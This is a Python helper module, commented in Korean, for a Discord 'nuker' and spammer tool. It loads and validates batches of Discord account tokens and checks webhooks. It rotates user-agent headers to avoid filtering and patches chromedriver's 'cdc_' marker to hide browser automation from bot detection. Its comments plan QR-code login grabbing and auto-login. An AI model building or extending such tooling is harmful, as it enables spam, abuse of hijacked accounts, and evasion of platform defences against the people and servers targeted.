import os
from typing import ClassVar, Final, Literal, Optional # <-- 시스템 명령어를 쓸 일이 많음
from colorama import Fore # <-- 디자인(배경 X 글씨 O)
import requests # <-- 웹페이지에 요청을 보낼 때 헤더가 필요한데 얘가 좀 도움이 됨
import ctypes

from pystyle import Add, Center, Anime, Colors, Colorate, Write, System

import io, sys, random, json
import re
import zipfile
from urllib.request import urlopen, urlretrieve
from distutils.version import LooseVersion
from time import sleep

###### 버전 지정 ######

CUR_VERSION = 0.1

###### 버전 지정 ######

###### 색 지정 ######

w = Fore.WHITE
b = Fore.BLACK
lg = Fore.LIGHTGREEN_EX
ly = Fore.LIGHTYELLOW_EX
lm = Fore.LIGHTMAGENTA_EX
lc = Fore.LIGHTCYAN_EX
lr = Fore.LIGHTRED_EX
lb = Fore.LIGHTBLUE_EX

###### 색 지정 ######

tokencnt = len(open('token.txt').readlines()) # 토큰 갯수 카운팅

if os.name != "nt": # 맥은 내가 프로그램 만들 줄 몰라서 못하고 리눅스는 굳이..? 해서 윈도우로 필터링함.
    print("ㅈㅅㅈㅅ, 님 OS에서 이거 안 돌아감")
    exit(-1)

os.system("title 엔터를 눌러라 닝겐...") # 타이틀에 명령하기

def OKAYLIST(): # 우리 프로그램은 메인 화면에서 메뉴가 띄워진 다음에 
    os.system("cls")
    global responseList
    responseList = ['yes', 'y', 'yeah', 'yep', 'ok', 'okay', 'yee', 'ye', 'sure', 'good']

# 크롬 드라이버를 이용하여 다양한 기능 : ex) 오토로그인, Qr그래빙
# 에 쓸 것임.
# 이야 크롬드라이버 다운로드 스크립트 찾았다.

google_target_version = 0 # 버전을 특정짓지 않음.(계속 업뎃되니까)

class Chrome_Installer(object): # 크롬 드라이버 설치 스크립트
    installed: ClassVar[bool] = False
    DL_BASE: Final[str] = "https://chromedriver.storage.googleapis.com/"

    def __init__(self, executable_path: Optional[str] = None,
                 target_version: Optional[int] = None,
                 *args, **kwargs):
        self.platform = sys.platform

        if google_target_version:
            self.target_version = google_target_version

        if target_version:
            self.target_version = target_version

        if not self.target_version:
            self.target_version = self.get_release_version_number().version[0]
            
        self._base = base_ = "chromedriver{}"

        exe_name = self._base
        if self.platform in ("win32",):
            exe_name = base_.format(".exe")
        if self.platform in ("linux",):
            self.platform += "64"
            exe_name = exe_name.format("")
        if self.platform in ("darwin",):
            self.platform = "mac64"
            exe_name = exe_name.format("")
        self.executable_path = executable_path or exe_name
        self._exe_name = exe_name

        if not os.path.exists(self.executable_path):
            self.fetch_chromedriver()
            if not self.__class__.installed and self.patch_binary():
                self.__class__.installed = True

    @staticmethod
    def random_cdc() -> bytes:
        cdc = random.choices('abcdefghijklmnopqrstuvwxyz', k=26)
        cdc[-6:-4] = map(str.upper, cdc[-6:-4])
        cdc[2] = cdc[0]
        cdc[3] = "_"
        return "".join(cdc).encode()

    def patch_binary(self):
        linect = 0
        replacement = self.random_cdc()
        with io.open(self.executable_path, "r+b") as fh:
            for line in iter(lambda: fh.readline(), b""):
                if b"cdc_" in line:
                    fh.seek(-len(line), 1)
                    newline = re.sub(b"cdc_.{22}", replacement, line)
                    fh.write(newline)
                    linect += 1
            return linect

    def get_release_version_number(self) -> LooseVersion:
        path = (
            "LATEST_RELEASE"
            if not self.target_version
            else f"LATEST_RELEASE_{self.target_version}"
        )
        return LooseVersion(urlopen(self.__class__.DL_BASE + path).read().decode())

    def fetch_chromedriver(self):
        base_ = self._base
        zip_name = base_.format(".zip")
        ver = self.get_release_version_number().vstring
        if os.path.exists(self.executable_path):
            return self.executable_path
        urlretrieve(
            f"{self.__class__.DL_BASE}{ver}/{base_.format(f'_{self.platform}')}.zip",
            filename=zip_name,
        )
        with zipfile.ZipFile(zip_name) as zf:
            zf.extract(self._exe_name)
        os.remove(zip_name)
        if sys.platform != "win32":
            os.chmod(self._exe_name, 0o755)
        return self._exe_name

def get_driver():
    driverList = ['chromedriver.exe'] # 우리는 구글파로 들어간다.(오페라, 익스플로러는 나중에 완성하고 나서 추가적으로 만들 예정)
    Write.print("\n설치된 드라이버 확인중!", Colors.blue_to_cyan, interval=0.015)
    sleep(0.052)
    for driver in driverList: # 드라이브 리스트에 설치 되어있는 목록들 체킹
        if os.path.exists(os.getcwd() + os.sep + driver): # os.sep = '\\'
            Write.print("\n크롬 드라이버가 이미 설치되어 있음!", Colors.blue_to_cyan, interval=0.015) # 만약 현재 폴더에 드라이버가 있다면
            sleep(0.5)
            return driver # 드라이버 이름 리턴
        else: # 드라이버 설치...
            Write.print("\n드라이버를 설치해 드림!\n\n", Colors.blue_to_cyan, interval=0.015) # 설치 메시지
            if os.path.exists(os.getenv('localappdata', default="") + '\\Google'):
                Chrome_Installer() # 크롬 드라이버 설치 스크립트 실행
                Write.print("\n크롬드라이버 실행파일 설치 완료!", Colors.blue_to_cyan, interval=0.015)
                return "chromedriver.exe" # 크롬 최고!
            else:
                Write.print("\n오류 | 드라이버 찾기 / 설치에 오류가 생겼습니다. 다시 시도 할게요!!\n", Colors.blue_to_cyan, interval=0.035)
                Chrome_Installer()
                Write.Print("\n크롬 드라이버를 다운로드합니다!\n\n", Colors.blue_to_cyan, interval=0.015)
                return "chromedriver.exe"

######################### 드라이버 설치 끝 #########################

def clear():
    system = os.name

    if system == "nt":
        os.system("cls")
    else:
        print('\n' * 120)
    return

def LoadingAnimation():
    loading_iconlist = ['|', '/', '-', '\\']

    for i in loading_iconlist:
        sys.stdout.write(f"""\r{ly}[{b}#{ly}]{w} 로딩중... {i}""")
        sys.stdout.flush()
        sleep(0.1)
    
def PrintAnimation(letters: str): # 글자를 애니메이션화 하여 출력
    for letter in letters:
        sys.stdout.write(letter);sys.stdout.flush();sleep(0.25) # 0.25초씩 딜레이 주면서 추력

def TokenValidator(token: str): # 토큰이 유효한지 검사하는 discord api
    '''내가 제작한 코드가 아니라, discord api뒤져서 가져옴'''
    base_url = "https://discord.com/api/v9/users/@me"
    message = "You need to verify your account in order to perform this action."

    r = requests.get(base_url, headers=heads(token))
    if r.status_code != 200:
        print(f"\n{Fore.RED}Invalid Token.{Fore.RESET}")
        sleep(1)
        __import__("spammer").main()
    j = requests.get(f'{base_url}/billing/subscriptions', headers=heads(token)).json()
    try:
        if j["message"] == message:
            print(f"\n{Fore.RED}폰 락된 토큰입니다!{Fore.RESET}")
            sleep(1)
            __import__("spammer").main()
    except TypeError:
        pass

headers = [
    {
        "Content-Type": "application/json",
        'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; rv:76.0) Gecko/20100101 Firefox/76.0'
    },

    {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0"
    },

    {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (X11; Debian; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0"
    },

    {
        "Content-Type": "application/json",
        'User-Agent': 'Mozilla/5.0 (Windows NT 3.1; rv:76.0) Gecko/20100101 Firefox/69.0'
    },

    {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (X11; Debian; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/76.0"
    },

    {
       "Content-Type": "application/json",
       "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"
    }
]

def heads(token: Optional[str] = None):
    header = random.choice(headers).copy() # 필터링 방지
    if token:
        header["Authorization"] = token
    return header

def getTemp() -> str | Literal[-1]: # temp 폴더 경로 복사
    system = os.name

    if system != 'nt':
        return -1
    else:
        return os.getenv('temp', -1)

def validateWebhook(hook: str): # 웹훅 볼리데이터
    if "api/webhooks" not in hook:
        print(f"\n{Fore.RED}존재하지 않는 웹훅입니다!{Fore.RESET}")
        sleep(1)
        __import__("spammer").main()
    try:
        responce = requests.get(hook)
    except (requests.exceptions.MissingSchema, requests.exceptions.InvalidSchema, requests.exceptions.ConnectionError):
        print(f"\n{Fore.RED}존재하지 않는 웹훅입니다!{Fore.RESET}")
        sleep(1)
        __import__("spammer").main()
    try:
        j = responce.json()["name"]
    except (KeyError, json.decoder.JSONDecodeError):
        print(f"\n{Fore.RED}존재하지 않는 웹훅입니다!{Fore.RESET}")
        sleep(1)
        __import__("spammer").main()
    print(f"{Fore.GREEN}존재하는 웹훅입니다! ({j})")

def setTitle(_str: str):
    system = os.name

    if system != 'nt':
        return -1 # 아직 지원 ㄴㄴ
    else:
        ctypes.windll.kernel32.SetConsoleTitleW(f"HYDRON_Nuker Alpha    |   Made by Lier0102 & ShinHaewon   |   토큰 수 : [{tokencnt}]")

System.Size(120, 30)
System.Clear()